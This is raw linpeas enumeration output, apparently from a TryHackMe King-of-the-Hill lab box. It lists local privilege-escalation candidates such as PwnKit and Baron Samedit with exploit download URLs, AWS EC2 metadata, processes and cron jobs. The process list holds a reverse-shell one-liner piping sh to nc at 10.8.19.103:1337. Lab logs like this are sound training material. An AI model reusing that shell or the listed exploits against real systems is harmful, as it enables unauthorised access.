[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Sat Feb 18 16:35:39 UTC 2023
 16:35:39 up 28 min,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184	/	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=bread
SHLVL=2
HOME=/home/bread
OLDPWD=/home/bread
LOGNAME=bread
JOURNAL_STREAM=9:18775
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=bee0b48386264fee881c324e4f649fc1
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security//5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security//5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-06a561cd68b41690a
instance-action: none
instance-id: i-0bbc802c5464173ec
instance-life-cycle: on-demand
instance-type: t2.micro
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-18T16:06:43Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:90:b6:78:1e:8d/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:

══╣ IAM Role

══╣ User Data

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.2  0.8 159632  8944 ?        Ss   16:07   0:03 /sbin/init maybe-ubiquity
root       391  0.0  1.6 127648 17068 ?        S<s  16:07   0:00 /lib/systemd/systemd-journald
root       415  0.0  0.1  97708  1892 ?        Ss   16:07   0:00 /sbin/lvmetad -f
root       420  0.0  0.4  45428  4380 ?        Ss   16:07   0:01 /lib/systemd/systemd-udevd
systemd+   506  0.0  0.3 141936  3344 ?        Ssl  16:07   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   627  0.0  0.5  80056  5344 ?        Ss   16:07   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   630  0.0  0.5  70640  5532 ?        Ss   16:07   0:00 /lib/systemd/systemd-resolved
root       723  0.0  1.6 169096 17040 ?        Ssl  16:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      725  0.0  1.0 108640 10124 ?        Ssl  16:07   0:00 /home/bread/main
bread     1267  0.0  0.3  11592  3192 ?        S    16:26   0:00  _ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
bread     1270  0.0  0.0   6316   764 ?        S    16:26   0:00      _ cat /tmp/f
bread     1271  0.0  0.0   4628   852 ?        S    16:26   0:00      _ sh -i
bread     1273  0.0  0.9  39084  9800 ?        S    16:27   0:00      |   _ python3 -c import pty;pty.spawn("/bin/bash")
bread     1274  0.0  0.4  21224  4820 pts/0    Ss   16:27   0:00      |       _ /bin/bash
bread     1328  0.1  0.2   5512  2564 pts/0    S+   16:35   0:00      |           _ /bin/sh ./linpeas.sh
bread     4724  0.0  0.0   5512   976 pts/0    S+   16:35   0:00      |               _ /bin/sh ./linpeas.sh
bread     4728  0.0  0.3  38524  3564 pts/0    R+   16:35   0:00      |               |   _ ps fauxwww
bread     4727  0.0  0.0   5512   976 pts/0    S+   16:35   0:00      |               _ /bin/sh ./linpeas.sh
bread     1272  0.0  0.2  15716  2136 ?        S    16:26   0:00      _ nc 10.8.19.103 1337
daemon[0m     726  0.0  0.2  28332  2404 ?        Ss   16:07   0:00 /usr/sbin/atd -f
message+   728  0.0  0.4  50100  4508 ?        Ss   16:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog     748  0.0  0.4 263036  4376 ?        Ssl  16:07   0:00 /usr/sbin/rsyslogd -n
root       757  0.0  0.3 106640  3656 ?        Ssl  16:07   0:00 /root/koth
root       758  0.0  0.3  30028  3300 ?        Ss   16:07   0:00 /usr/sbin/cron -f
tryhack+   763  0.0  0.5 106640  5532 ?        Ssl  16:07   0:00 /home/tryhackme/img
root       766  0.0  0.6 286340  6976 ?        Ssl  16:07   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       767  0.0  0.1 621536  1700 ?        Ssl  16:07   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       768  0.0  0.5  62124  5688 ?        Ss   16:07   0:00 /lib/systemd/systemd-logind
root       771  0.3  2.4 557680 25032 ?        Ssl  16:07   0:05 /usr/lib/snapd/snapd
root       772  0.0  0.3  33996  3180 ?        Ss   16:07   0:00 /usr/sbin/inetd
root       783  0.0  0.2  14664  2392 ttyS0    Ss+  16:07   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       793  0.0  0.1  14888  1976 tty1     Ss+  16:07   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       806  0.0  0.7 291460  7284 ?        Ssl  16:07   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.6  72300  6400 ?        Ss   16:07   0:00 /usr/sbin/sshd -D
root       820  0.0  1.9 185948 20124 ?        Ssl  16:07   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      835  0.1 17.6 1166760 177312 ?      Sl   16:07   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
-rwxr-xr-x 1 root      root       1113504 Jun  6  2019 /bin/bash
lrwxrwxrwx 1 root      root             4 Aug  5  2019 /bin/sh -> dash
-rwxrwxr-x 1 tryhackme tryhackme  7390798 Mar 20  2020 /home/tryhackme/img
-rwxr-xr-x 1 root      root        129096 Feb  6  2020 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root      root        219272 Feb  6  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root      root       1633360 Feb  6  2020 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root      root        378944 Feb  6  2020 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root      root         38976 Feb  6  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root      root        584136 Feb  6  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root      root         56552 Jan  8  2020 /sbin/agetty
lrwxrwxrwx 1 root      root            20 Feb  6  2020 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root      root         84104 Dec  5  2019 /sbin/lvmetad
-rwxr-xr-x 1 root      root        236584 Jun 10  2019 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root      root         18504 Nov 23  2018 /usr/bin/lxcfs
lrwxrwxrwx 1 root      root             9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root      root        182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root      root         14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root      root      18927720 Oct 30  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root      root         26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root      root         47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root      root         39296 Nov  1  2017 /usr/sbin/inetd
-rwxr-xr-x 1 root      root      24613992 Jan 21  2020 /usr/sbin/mysqld
-rwxr-xr-x 1 root      root        680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root      root        786856 Mar  4  2019 /usr/sbin/sshd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Mar 20  2020 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Mar 20  2020 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Sun  UTC  7h left       Sat  UTC  28min ago apt-daily.timer              apt-daily.service
Sun  UTC  14h left      Sat  UTC  28min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun  UTC  16h left      Sat  UTC  28min ago motd-news.timer              motd-news.service
